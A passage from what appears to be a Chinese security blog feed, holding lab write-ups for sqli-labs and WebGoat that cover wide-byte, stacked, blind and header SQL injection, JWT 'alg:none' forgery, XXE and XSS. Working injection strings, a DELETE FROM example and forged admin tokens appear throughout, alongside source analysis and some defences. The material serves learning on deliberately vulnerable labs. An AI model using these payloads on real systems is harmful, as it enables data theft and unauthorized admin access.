1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273--+</code></pre><p><img src="https://pic.downk.cc/item/5f193dcc14195aa5941eee5d.png" alt=""></p><p>其余同联合注入</p><h5 id="4-防御"><a href="#4-防御" class="headerlink" title="4.防御"></a>4.防御</h5><p>使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞。</p><pre><code>Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);</code></pre><h4 id="4-3-2-Less-34-post方法"><a href="#4-3-2-Less-34-post方法" class="headerlink" title="4.3.2 Less-34(post方法)"></a>4.3.2 Less-34(post方法)</h4><p>post类型（将’ 转换为 utf-16 或 utf-32，例如将 ‘ 转为 utf-16 为 �‘）</p><pre><code>username:�&#39; or 1=1#password: 随便填</code></pre><h4 id="4-3-1-Less-36"><a href="#4-3-1-Less-36" class="headerlink" title="4.3.1 Less-36"></a>4.3.1 Less-36</h4><h5 id="1-源代码"><a href="#1-源代码" class="headerlink" title="1. 源代码"></a>1. 源代码</h5><pre><code>function check_quotes($string){    $string= mysql_real_escape_string($string);        return $string;}// take the variables if(isset($_GET[&#39;id&#39;])){$id=check_quotes($_GET[&#39;id&#39;]);</code></pre><p>上面的 check_quotes()函数是利用了 mysql_real_escape_string()函数进行的过滤。 </p><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 </p><p>下列字符受影响： </p><ul><li><p>\x00 </p></li><li><p>\n </p></li><li><p>\r </p></li><li><p>\ </p></li><li><p>‘ </p></li><li><p>“ </p></li><li><p>\x1a </p></li></ul><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p><h5 id="2-突破"><a href="#2-突破" class="headerlink" title="2. 突破"></a>2. 突破</h5><p>但是因 mysql 我们并没有设置成 gbk，所以mysql_real_escape_string()依旧能够被突破：</p><ul><li>将’编码为utf-16</li></ul><pre><code>?id=-1%EF%BF%BD&#39; union select 1,user(),3--+</code></pre><ul><li>使用%df吃\</li></ul><pre><code>?id=-1%df&#39; union select 1,user(),3--+</code></pre><h5 id="3-防护"><a href="#3-防护" class="headerlink" title="3. 防护"></a>3. 防护</h5><p>在使用 mysql_real_escape_string()时，如何能够安全的防护这种问题，需要将 mysql 设置为 gbk 即可。 设置代码： </p><pre><code>Mysql_set_charset(‘gbk’,’$conn’)</code></pre><h2 id="5-Stacked-Injection-堆叠注入"><a href="#5-Stacked-Injection-堆叠注入" class="headerlink" title="5. Stacked Injection 堆叠注入"></a>5. Stacked Injection 堆叠注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 union或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是 任意的语句。</p><p>例如：</p><blockquote><p>用户输入： </p><p>1; DELETE FROM products </p><p>服务器端生成的 sql 语句为：（因未对输入的参数进行过滤） </p><p>Select * from products where productid=1;DELETE FROM products</p></blockquote><p>当执行查询后，第一条显示查询信息，第二条则将整个表删除。</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h3 id="1-Less-38"><a href="#1-Less-38" class="headerlink" title="1. Less-38"></a>1. Less-38</h3><h3 id="1-1-判断类型"><a href="#1-1-判断类型" class="headerlink" title="1.1 判断类型"></a>1.1 判断类型</h3><ul><li>get型注入</li><li>有回显</li><li>有错误提示</li></ul><p>综上初判使用联合注入</p><h3 id="1-2-找注入点"><a href="#1-2-找注入点" class="headerlink" title="1.2 找注入点"></a>1.2 找注入点</h3><pre><code>?id=1 //正常?id=1&#39; //出错?id=1&#39;--+ //正常</code></pre><p>综上，注入点为?id=1’</p><h3 id="1-3-获取数据库结构"><a href="#1-3-获取数据库结构" class="headerlink" title="1.3 获取数据库结构"></a>1.3 获取数据库结构</h3><p>通过爆库爆表爆字段来获知数据库结构，才能进行堆叠注入，此处省略 </p><h3 id="1-4-堆叠注入"><a href="#1-4-堆叠注入" class="headerlink" title="1.4 堆叠注入"></a>1.4 堆叠注入</h3><p> 插入用户</p><pre><code>?id=1&#39;;insert into users(id,username,password) values (&#39;21&#39;,&#39;zby&#39;,&#39;123&#39;)--+</code></pre><p><img src="https://pic.downk.cc/item/5f194d0514195aa59429a051.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="/2020/07/21/sqli-labs1/"/>
      <url>/2020/07/21/sqli-labs1/</url>
      
        <content type="html"><![CDATA[<h2 id="sql注入思路"><a href="#sql注入思路" class="headerlink" title="sql注入思路"></a>sql注入思路</h2><p><img src="https://pic.downk.cc/item/5f1a437d14195aa594bb64b7.png" alt=""></p><h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><p>post就是数据从客户端提交 到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交， 提交到服务器后服务器再进行验证</p><h2 id="1-基于提示的post注入"><a href="#1-基于提示的post注入" class="headerlink" title="1. 基于提示的post注入"></a>1. 基于提示的post注入</h2><p>此种注入需要搭配BP使用，显示位有效位等通过抓包查看http消息主体</p><h3 id="1-1-Less-11-回显-错误提示"><a href="#1-1-Less-11-回显-错误提示" class="headerlink" title="1.1 Less-11(回显/错误提示)"></a>1.1 Less-11(回显/错误提示)</h3><h4 id="1-1-1-找注入点"><a href="#1-1-1-找注入点" class="headerlink" title="1.1.1 找注入点"></a>1.1.1 找注入点</h4><p>输入万能密码：</p><pre><code>admin&#39; //出错admin&#39; and 1=1# //注入成功admin&#39; or &#39;1&#39;=&#39;1#  //万能密码密码随意</code></pre><p><img src="https://pic.downk.cc/item/5f169d0914195aa594c137bd.png" alt=""></p><h4 id="1-1-2-爆库"><a href="#1-1-2-爆库" class="headerlink" title="1.1.2 爆库"></a>1.1.2 爆库</h4><pre><code>-1&#39; union select 1,database()#密码随意</code></pre><p><img src="https://pic.downk.cc/item/5f169fd314195aa594c3155f.png" alt=""></p><h4 id="1-1-3-爆表"><a href="#1-1-3-爆表" class="headerlink" title="1.1.3 爆表"></a>1.1.3 爆表</h4><pre><code>-1&#39; union select group_concat(table_name),2 from information_schema.tables where table_schema=&#39;security&#39;#密码随意</code></pre><p><img src="https://pic.downk.cc/item/5f16a2c414195aa594c44ba4.png" alt=""></p><p>爆列爆数据操作同get sql注入(参阅sqli-labs1)</p><h3 id="1-2-Less-12-回显-错误提示"><a href="#1-2-Less-12-回显-错误提示" class="headerlink" title="1.2 Less-12(回显/错误提示)"></a>1.2 Less-12(回显/错误提示)</h3><h4 id="1-2-1-寻找注入点"><a href="#1-2-1-寻找注入点" class="headerlink" title="1.2.1 寻找注入点"></a>1.2.1 寻找注入点</h4><pre><code>admin&#39; //正常admin&quot; //出错</code></pre><p><img src="https://pic.downk.cc/item/5f16a6ca14195aa594c67036.png" alt=""></p><p>根据错误继续测试注入点</p><pre><code>admin&quot;) and 1=1#   注入成功</code></pre><p>其余注入同less-11，只需把admin’ 改为admin”)即可</p><h3 id="1-3-Less-13-错误提示"><a href="#1-3-Less-13-错误提示" class="headerlink" title="1.3 Less-13(错误提示)"></a>1.3 Less-13(错误提示)</h3><p>源代码</p><pre><code>if($row)    {          //echo &#39;&lt;font color= &quot;#0000ff&quot;&gt;&#39;;              echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#39;;        //echo &quot; You Have successfully logged in &quot; ;        echo &#39;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#39;;            echo &quot;&lt;br&gt;&quot;;        //echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];        //echo &quot;&lt;br&gt;&quot;;        //echo &#39;Your Password:&#39; .$row[&#39;password&#39;];        //echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;/font&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#39;;              echo &quot;&lt;/font&gt;&quot;;      }    else      {        echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;;        //echo &quot;Try again looser&quot;;        print_r(mysql_error());        echo &quot;&lt;/br&gt;&quot;;        echo &quot;&lt;/br&gt;&quot;;        echo &quot;&lt;/br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#39;;            echo &quot;&lt;/font&gt;&quot;;      }}?&gt;</code></pre><p>由上可知显示数据库错误，考虑盲注，且有错误提示，考虑updatexml()注入</p><h4 id="1-3-1-找注入点"><a href="#1-3-1-找注入点" class="headerlink" title="1.3.1 找注入点"></a>1.3.1 找注入点</h4><pre><code>admin&#39; //出错，提示加括号admin&#39;)  //出错admin&#39;)# //不显示错误，可确定注入点为admin&#39;)</code></pre><h4 id="1-3-1-2-爆库"><a href="#1-3-1-2-爆库" class="headerlink" title="1.3.1.2 爆库"></a>1.3.1.2 爆库</h4><pre><code>-1&#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)#4</code></pre><p><img src="https://pic.downk.cc/item/5f16adb914195aa594c975ee.png" alt=""></p><p>其他类似get sql注入中的基于错误的盲注</p><h3 id="1-4-Less-14"><a href="#1-4-Less-14" class="headerlink" title="1.4 Less-14"></a>1.4 Less-14</h3><p>注入点为admin’ ，其余同13</p><h2 id="2-基于时间的盲注"><a href="#2-基于时间的盲注" class="headerlink" title="2. 基于时间的盲注"></a>2. 基于时间的盲注</h2><p>此种情况下，没有错误提示，也没有回显</p><h3 id="2-1-Less-15"><a href="#2-1-Less-15" class="headerlink" title="2.1 Less-15"></a>2.1 Less-15</h3><h4 id="2-1-1-找注入点"><a href="#2-1-1-找注入点" class="headerlink" title="2.1.1 找注入点"></a>2.1.1 找注入点</h4><pre><code>admin&#39; and if(1=2,1,sleep(5))#  //延迟5s，找到注入点</code></pre><h4 id="2-1-2-猜测数据库"><a href="#2-1-2-猜测数据库" class="headerlink" title="2.1.2 猜测数据库"></a>2.1.2 猜测数据库</h4><pre><code>admin&#39; and if(left(database(),1)&gt;&#39;h&#39;,1,sleep(5))#  //此处数据库名第一个字母为s，所以会延迟5s</code></pre><p>其余同get sql注入基于布尔的盲注</p><h3 id="2-2-Less-16"><a href="#2-2-Less-16" class="headerlink" title="2.2 Less-16"></a>2.2 Less-16</h3><h4 id="2-2-1-找到注入点"><a href="#2-2-1-找到注入点" class="headerlink" title="2.2.1 找到注入点"></a>2.2.1 找到注入点</h4><pre><code>admin&quot;) and if(1=2,1,sleep(5))#  //延迟，找到注入点</code></pre><p>其余同less-15</p><h2 id="3-update注入"><a href="#3-update注入" class="headerlink" title="3. update注入"></a>3. update注入</h2><h3 id="3-1-Less-17"><a href="#3-1-Less-17" class="headerlink" title="3.1 Less-17"></a>3.1 Less-17</h3><h4 id="3-1-找注入点"><a href="#3-1-找注入点" class="headerlink" title="3.1 找注入点"></a>3.1 找注入点</h4><p>如用户更换密码，这种场景属于update注入。注入点在密码栏上</p><pre><code>password: 1&#39; //报错1‘# //正常</code></pre><p><img src="https://pic.downk.cc/item/5f16b6cd14195aa594ccaf5e.png" alt=""></p><p>综上，sql注入点在1’</p><h4 id="3-2-爆库"><a href="#3-2-爆库" class="headerlink" title="3.2 爆库"></a>3.2 爆库</h4><p>在本关中无回显，有错误提示，可以用updatexml()</p><pre><code>1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)#</code></pre><p><img src="https://pic.downk.cc/item/5f16b86014195aa594cd1d58.png" alt=""></p><p>其余同updatexml()，基于错误的盲注</p><h2 id="4-http请求注入"><a href="#4-http请求注入" class="headerlink" title="4. http请求注入"></a>4. http请求注入</h2><p>寻找http其他可注入点进行注入</p><h3 id="4-1-Less-18"><a href="#4-1-Less-18" class="headerlink" title="4.1 Less-18"></a>4.1 Less-18</h3><p>查看源码</p><pre><code>$uname = check_input($_POST[&#39;uname&#39;]);$passwd = check_input($_POST[&#39;passwd&#39;]);</code></pre><p>username和password都采用了check_input的方法，所以无法进行注入，但在源码中还有一处sql语句：</p><pre><code>$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;mysql_query($insert);</code></pre><p>于是此处可采用修改User-Agent的方式来进行注入</p><p><img src="https://pic.downk.cc/item/5f16c00114195aa594d0745c.png" alt=""></p><blockquote><p>没有回显</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebGoat</title>
      <link href="/2020/07/13/webgoat/"/>
      <url>/2020/07/13/webgoat/</url>
      
        <content type="html"><![CDATA[<h2 id="WebGoat"><a href="#WebGoat" class="headerlink" title="WebGoat"></a>WebGoat</h2><p>WebGoat是一个基于java应用的开源漏洞环境</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li><p>要确保虚拟机中装有Java环境</p></li><li><p>下载webgoat-server/webwolf文件</p></li><li><p>在虚拟机中执行以下命令</p><pre class=" language-bash"><code class="language-bash">java -jar webgoat-server文件名 --server.address<span class="token operator">=</span>0.0.0.0java -jar webwolf文件名 --server.address<span class="token operator">=</span>0.0.0.0</code></pre></li><li><p>Web页面测试是否安装成功，访问http://本机ip:8080/WebGoat,出现以下页面则表明安装成功<br><img src="https://pic.downk.cc/item/5f0d1b5414195aa594bba77b.png" alt=""></p></li></ol><h2 id="1-认证机制"><a href="#1-认证机制" class="headerlink" title="1 认证机制"></a>1 认证机制</h2><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><ul><li>通过html隐藏的input标签值</li><li>通过移除/修改提交的参数来确认程序的响应</li><li>通过猜测或暴力破解强制访问站点的某些url</li></ul><h3 id="1-1-绕过认证-Authentication-Bypasses"><a href="#1-1-绕过认证-Authentication-Bypasses" class="headerlink" title="1.1 绕过认证(Authentication Bypasses)"></a>1.1 绕过认证(Authentication Bypasses)</h3><h4 id="1-1-1-实践"><a href="#1-1-1-实践" class="headerlink" title="1.1.1 实践"></a>1.1.1 实践</h4><p><img src="https://pic.downk.cc/item/5f1a509014195aa594c2534f.png" alt=""></p><p>修改上述http消息主体的参数为secQuestion2/3</p><p><img src="https://pic.downk.cc/item/5f1a59ad14195aa594c673b7.png" alt=""></p><p>成功绕过该验证机制</p><p><img src="https://pic.downk.cc/item/5f1a59f914195aa594c69614.png" alt=""></p><h4 id="1-1-2-源代码"><a href="#1-1-2-源代码" class="headerlink" title="1.1.2 源代码"></a>1.1.2 源代码</h4><pre><code> public boolean verifyAccount(Integer userId, HashMap&lt;String, String&gt; submittedQuestions) {        //short circuit if no questions are submitted        if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) {            return false;        }        if (submittedQuestions.containsKey(&quot;secQuestion0&quot;) &amp;&amp; !submittedQuestions.get(&quot;secQuestion0&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion0&quot;))) {            return false;        }        if (submittedQuestions.containsKey(&quot;secQuestion1&quot;) &amp;&amp; !submittedQuestions.get(&quot;secQuestion1&quot;).equals(secQuestionStore.get(verifyUserId).get(&quot;secQuestion1&quot;))) {            return false;        }        // else        return true;    }}</code></pre><p>由上述代码可知，身份认证中只对变量名为secQuestion0/1的变量进行了检验，安全设置只局限在secQuestion0/1变量上，如果修改变量名为secQuestion3/4,就可以绕过该限制，从而成功实施攻击。该漏洞代码的缺陷：</p><ul><li>没有对传入的变量进行限制</li></ul><h3 id="1-2-JWT"><a href="#1-2-JWT" class="headerlink" title="1.2 JWT"></a>1.2 JWT</h3><h4 id="1-2-1-概述"><a href="#1-2-1-概述" class="headerlink" title="1.2.1 概述"></a>1.2.1 概述</h4><p>JWT(Json Web Tokens),JWT与Web服务器交互<br><img src="https://pic.downk.cc/item/5f0d651514195aa594d1853b.png" alt=""></p><p>在此流程中，可以看到用户使用用户名和密码登录服务器后返回的成功身份验证。服务器创建一个新令牌并将其返回给客户端。当客户端对服务器进行连续调用时，它将新令牌附加在“授权”标头中。服务器读取令牌，并在成功验证后首先验证签名，然后服务器使用令牌中的信息来识别用户。</p><h5 id="JWT签名"><a href="#JWT签名" class="headerlink" title="JWT签名"></a>JWT签名</h5><p>每个JWT令牌至少应在发送给客户端之前进行签名，如果未签名，则客户端应用程序将能够更改令牌的内容。</p><h4 id="1-2-2-token的组成"><a href="#1-2-2-token的组成" class="headerlink" title="1.2.2 token的组成"></a>1.2.2 token的组成</h4><p>令牌是base64-url编码的，由三部分组成：header.claims.signature</p><p><img src="https://pic.downk.cc/item/5f1a7cb614195aa594d60656.png" alt=""></p><p>JWT的内容以Base64URL进行了编码,base64加解码网站：<a href="https://jwt.io/#encoded-jwt" target="_blank" rel="noopener">https://jwt.io/#encoded-jwt</a></p><h5 id="header头部"><a href="#header头部" class="headerlink" title="header头部"></a>header头部</h5><p>以上图中的JWT为例，头部解码后为：</p><pre><code>{  &quot;alg&quot;:&quot;HS256&quot;,  &quot;typ&quot;:&quot;JWT&quot;}</code></pre><ul><li>alg:是说明这个JWT的签名使用的算法的参数，常见值用HS256（默认），HS512等，也可以为None。HS256表示HMAC SHA256。</li><li>typ:说明这个token的类型为JWT</li></ul><h5 id="claims声明"><a href="#claims声明" class="headerlink" title="claims声明"></a>claims声明</h5><p>上图JWT的claims解码后为：</p><pre><code>{  &quot;exp&quot;: 1416471934,  &quot;user_name&quot;: &quot;user&quot;,  &quot;scope&quot;: [    &quot;read&quot;,    &quot;write&quot;  ],  &quot;authorities&quot;: [    &quot;ROLE_ADMIN&quot;,    &quot;ROLE_USER&quot;  ],  &quot;jti&quot;: &quot;9bc92a44-0b1a-4c5e-be70-da52075b9a84&quot;,  &quot;client_id&quot;: &quot;my-client-with-secret&quot;}</code></pre><p>其中有些字段是JWT的固定参数，有特定的含义；而另一些是服务器自定义的参数，用来表示通话信息等。</p><h5 id="signature签名"><a href="#signature签名" class="headerlink" title="signature签名"></a>signature签名</h5><p>服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对header和claims的内容用此密码进行加密，生成的字符串就是JWT的签名。</p><pre><code>HMACSHA256(  base64UrlEncode(header) + &quot;.&quot; +  base64UrlEncode(payload),  your-256-bit-secret)</code></pre><blockquote><p>注：在HTTP传输过程中，Base64编码中的”=”,”+”,”/“等特殊符号通过URL解码通常容易产生歧义，因此产生了与URL兼容的Base64 URL编码。在Base64 URL编码中，”+”会变成”-“，”/“会变成”_”，”=”会被去掉，以此达到url safe的目的。</p></blockquote><h4 id="1-2-3-实践4"><a href="#1-2-3-实践4" class="headerlink" title="1.2.3 实践4"></a>1.2.3 实践4</h4><p>尝试更改收到的令牌并通过更改令牌成为管理员用户，一旦成为管理员，就重置投票</p><p>先切换用户，然后点击重置密码,并使用BP进行抓包：</p><p><img src="https://pic.downk.cc/item/5f1a86f814195aa594db2bb0.png" alt=""></p><p><img src="https://pic.downk.cc/item/5f1a871a14195aa594db408a.png" alt=""></p><p>对上述token进行解码：</p><p><img src="https://pic.downk.cc/item/5f1a87ca14195aa594db9c8d.png" alt=""></p><p>此处我们将admin字段修改为true，一旦内容改变，token的签名也随之改变，所以此处我们可以将alg设为none，即没有加密算法来进行绕过。</p><h5 id="头部"><a href="#头部" class="headerlink" title="头部"></a>头部</h5><pre><code>{   &quot;alg&quot;:&quot;none&quot;}</code></pre><p>编码后：</p><pre><code>ewogICAiYWxnIjoibm9uZSIKfQ==</code></pre><h5 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h5><pre><code>{  &quot;iat&quot;: 1596437866,  &quot;admin&quot;: &quot;true&quot;,  &quot;user&quot;: &quot;Tom&quot;}</code></pre><p>编码后：</p><pre><code>ewogICJpYXQiOiAxNTk2NDM3ODY2LAogICJhZG1pbiI6ICJ0cnVlIiwKICAidXNlciI6ICJUb20iCn0=</code></pre><h5 id="最终token"><a href="#最终token" class="headerlink" title="最终token"></a>最终token</h5><pre><code>ewogICAiYWxnIjoibm9uZSIKfQ.ewogICJpYXQiOiAxNTk2NDM3ODY2LAogICJhZG1pbiI6ICJ0cnVlIiwKICAidXNlciI6ICJUb20iCn0.</code></pre><blockquote><p>注：要把末尾的=去掉，一定要加上.</p></blockquote><p>转发之后，服务器返回的响应如下：</p><p><img src="https://pic.downk.cc/item/5f1a8a1914195aa594dd0f8d.png" alt=""></p><p>此时我们就可以利用管理员token冒充管理员执行操作</p><h5 id="源代码解析"><a href="#源代码解析" class="headerlink" title="源代码解析"></a>源代码解析</h5><p>从http请求中解析token的代码如下：</p><pre><code>encodedHeader = TextCodec.BASE64URL.encode(jsonHeader);            encodedPayload = TextCodec.BASE64URL.encode(jsonPayload);            if (jsonHeader.toLowerCase().contains(&quot;none&quot;)) {                encodedSignature=&quot;&quot;;            } else {                encodedSignature = TextCodec.BASE64URL.encode(getJWTSignature(jsonHeader, encodedHeader, encodedPayload, jsonSecret));            }</code></pre><p>从上述代码中可知，如果头部指定的算法字段为none，则签名可以为空，此代码就给篡改token有机可趁。</p><h3 id="1-2-4-实践7"><a href="#1-2-4-实践7" class="headerlink" title="1.2.4 实践7"></a>1.2.4 实践7</h3><p>让他人代付</p><p>查看题目给出的token日志：</p><p><img src="https://pic.downk.cc/item/5f1a910d14195aa594e09b8d.png" alt=""></p><p>对token进行解码：</p><p><img src="https://pic.downk.cc/item/5f1a916e14195aa594e0c9c7.png" alt=""></p><p>其中claims中的exp字段是token过期时间，将鼠标放上去JWT会自动解析时间，我们只需直接在上面修改数字查看时间，只要时间在当前时间之后就可以。同时把头部的alg置为None:</p><h5 id="声明-1"><a href="#声明-1" class="headerlink" title="声明"></a>声明</h5><pre><code>{  &quot;iat&quot;: 1526131411,  &quot;exp&quot;: 1629217911,  &quot;admin&quot;: &quot;false&quot;,  &quot;user&quot;: &quot;Tom&quot;}</code></pre><p>编码后：</p><pre><code>ewogICJpYXQiOiAxNTI2MTMxNDExLAogICJleHAiOiAxNjI5MjE3OTExLAogICJhZG1pbiI6ICJmYWxzZSIsCiAgInVzZXIiOiAiVG9tIgp9</code></pre><h5 id="最终token-1"><a href="#最终token-1" class="headerlink" title="最终token"></a>最终token</h5><pre><code>ewogICAiYWxnIjoibm9uZSIKfQ.ewogICJpYXQiOiAxNTI2MTMxNDExLAogICJleHAiOiAxNjI5MjE3OTExLAogICJhZG1pbiI6ICJmYWxzZSIsCiAgInVzZXIiOiAiVG9tIgp9.</code></pre><p>修改http请求authorization的值为token</p><p><img src="https://pic.downk.cc/item/5f1a93b314195aa594e1c659.png" alt=""></p><p><img src="https://pic.downk.cc/item/5f1a93cd14195aa594e1d237.png" alt=""></p><h2 id="2-不安全的对象直接引用"><a href="#2-不安全的对象直接引用" class="headerlink" title="2. 不安全的对象直接引用"></a>2. 不安全的对象直接引用</h2><p>直接使用用户输入去访问数据和对象会造成不安全的对象直接引用。</p><h3 id="2-1-XXE"><a href="#2-1-XXE" class="headerlink" title="2.1 XXE"></a>2.1 XXE</h3><h4 id="2-1-1-XML实体"><a href="#2-1-1-XML实体" class="headerlink" title="2.1.1 XML实体"></a>2.1.1 XML实体</h4><p>XML(E<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage)，可扩展标记语言，是一种用于标记电子文件，使其具有结构性的标记语言，可以用来标记数据，定义数据类型。与HTML不同：HTML被设计来显示数据，XML被设计来传输数据。XML实体定义解析XML文档时被特定内容替换的标签，通常有三种类型的实体：</p><ul><li>内部实体</li><li>外部实体</li><li>参数实体<br>一个实体必须由DTD(Document Type Definition)创造，如下图所示<br><img src="https://pic.downk.cc/item/5f0ea52514195aa59429fc94.png" alt=""><br>一旦上述XML文档被解析(绿框中的内容)，定义的实体js就会被替换成“John Smith”。在java应用中，XML可以用于从客户端获取数据发送到服务器端。</li></ul><h5 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h5><p>实体都以&amp;开头，以；结束，上图中&js;就是实体</p><h5 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h5><p>创建内部实体的格式：</p><pre><code>&lt;!ENTITY {实体名} &quot;{用来替代实体的文本}&quot;&gt;&lt;!ENTITY js &quot;This is text&quot;</code></pre><p>调用格式</p><pre><code>&amp;{实体名};&amp;js;</code></pre><h5 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h5><p>外部实体引用的是来自外部的文件：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;  &lt;!DOCTYPE test [    &lt;!ENTITY bbb SYSTEM &quot;1.xml&quot;&gt;  ]&gt;&amp;bbb;</code></pre><p>外部实体中的SYSTEM表示引用系统外的文件。</p><h4 id="2-2-XXE注入"><a href="#2-2-XXE注入" class="headerlink" title="2.2 XXE注入"></a>2.2 XXE注入</h4><p>XXE(XML External Entity，XML外部实体)攻击是一种破坏应用解析XML输入的攻击。XML输入中包含一个被易受攻击的XML解析器解析的外部实体的引用就会诱发此种攻击。</p><h4 id="2-3-XXE攻击分类"><a href="#2-3-XXE攻击分类" class="headerlink" title="2.3 XXE攻击分类"></a>2.3 XXE攻击分类</h4><ul><li>Classic：一个外部实体包含在本地DTD语言中</li><li>Blind: 在响应中不会显示输出或错误</li><li>Error: 尝试从错误信息中获取资源内容</li></ul><h4 id="2-4-实践"><a href="#2-4-实践" class="headerlink" title="2.4 实践"></a>2.4 实践</h4><h5 id="XXE-4"><a href="#XXE-4" class="headerlink" title="XXE-4"></a>XXE-4</h5><p><img src="https://pic.downk.cc/item/5f1aa16e14195aa594e93bfa.png" alt=""></p><p>响应中返回file:/c的文件</p><h5 id="XXE-7"><a href="#XXE-7" class="headerlink" title="XXE-7"></a>XXE-7</h5><p>服务器可能能够接受其他的数据格式。因此，这可能导致JSON端点容易受到XXE攻击。</p><p><img src="https://pic.downk.cc/item/5f1e2ed214195aa594715c17.png" alt=""></p><p>源代码：</p><pre><code> public AttackResult createNewUser(@RequestBody String commentStr, @RequestHeader(&quot;Content-Type&quot;) String contentType) throws Exception {        AttackResult attackResult = failed(this).build();        if (APPLICATION_JSON_VALUE.equals(contentType)) {            comments.parseJson(commentStr).ifPresent(c -&gt; comments.addComment(c, true));            attackResult = failed(this).feedback(&quot;xxe.content.type.feedback.json&quot;).build();        }        if (null != contentType &amp;&amp; contentType.contains(MediaType.APPLICATION_XML_VALUE)) {            String error = &quot;&quot;;            try {                Comment comment = comments.parseXml(commentStr);                comments.addComment(comment, false);                if (checkSolution(comment)) {                    attackResult = success(this).build();                }            } catch (Exception e) {                error = org.apache.commons.lang.exception.ExceptionUtils.getFullStackTrace(e);                attackResult = failed(this).feedback(&quot;xxe.content.type.feedback.xml&quot;).output(error).build();            }        }        return attackResult;    }</code></pre><p>由上可知服务器端对json/xml格式的数据都进行了解析处理，所以可以将json数据改为xml数据，进而实施xxe攻击。</p><h2 id="3-XSS"><a href="#3-XSS" class="headerlink" title="3.XSS"></a>3.XSS</h2><h3 id="3-1-实践"><a href="#3-1-实践" class="headerlink" title="3.1 实践"></a>3.1 实践</h3><h4 id="3-1-1-XSS-7"><a href="#3-1-1-XSS-7" class="headerlink" title="3.1.1 XSS-7"></a>3.1.1 XSS-7</h4><p><img src="https://pic.downk.cc/item/5f1e3a1f14195aa5947e5bef.png" alt=""></p><p>点击UpdateCart，下方显示card number,可知可能存在XSS漏洞，尝试构建payload:</p><pre><code>&lt;script&gt;alert(&quot;XSS Test&quot;)&lt;/script&gt;</code></pre><p><img src="https://pic.downk.cc/item/5f1e3af214195aa5947f5442.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> WebGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP安全</title>
      <link href="/2020/07/13/web1/"/>
      <url>/2020/07/13/web1/</url>
      
        <content type="html"><![CDATA[<h2 id="Web架构"><a href="#Web架构" class="headerlink" title="Web架构"></a>Web架构</h2><p>详情参考(<a href="https://www.cnblogs.com/fundebug/p/web_architecture_101.html" target="_blank" rel="noopener">https://www.cnblogs.com/fundebug/p/web_architecture_101.html</a>)<br>Web工作中</p><h2 id="CMS框架"><a href="#CMS框架" class="headerlink" title="CMS框架"></a>CMS框架</h2><p>内容管理系统（content management system，CMS）是一种位于WEB 前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。</p><h3 id="框架本质"><a href="#框架本质" class="headerlink" title="框架本质"></a>框架本质</h3><p>从URL输入到数据处理到数据输出的过程</p><ul><li>输出为Html页面：MVC模式</li><li>输出为JSON的数据集合：接口模式</li></ul><h3 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h3><p>用户输入URL-&gt;rewrite等操作将URL导入到入口文件index.php-&gt;预设常量-&gt;解析URL生成路由（伪静态实现的地方），从路由中分解出控制器和方法-&gt;类的自动载入实现-&gt;调用控制器-&gt;控制器调用服务-&gt;服务调用model-&gt;控制器获取数据-&gt;控制器包含HTML文件（这一步可以实现页面缓存）-&gt;正则匹配将HTML文件中的变量和表达式转换为PHP的语法（前端模板，如blade和smarty）-&gt;生成纯HTML页面-&gt;返回给浏览器-&gt;浏览器渲染<br>参考链接(<a 